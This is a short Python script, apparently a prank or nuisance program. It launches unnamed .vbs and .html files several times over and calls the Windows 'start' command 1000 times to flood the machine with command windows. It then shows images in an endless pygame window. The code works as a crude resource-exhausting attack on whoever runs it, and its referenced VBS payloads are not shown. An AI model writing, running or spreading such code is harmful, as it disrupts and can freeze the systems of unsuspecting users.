import os
import pygame
from pygame.locals import *

for i in range(5):
	os.system("start new.vbs")
for f in range(5):
        os.system("start 1249517251085.html")
os.system("start 9217872357035.vbs")      
for i in range(1000):
        os.system("start")  


pygame.init()

screen = pygame.display.set_mode((1600,1200),0,32)


background = pygame.image.load("114287421.jpeg").convert()
image = pygame.image.load("124217651825.gif").convert_alpha()
while True:
        screen.blit(background,(0,0))
        screen.blit(image,(10,10))
        pygame.display.update()





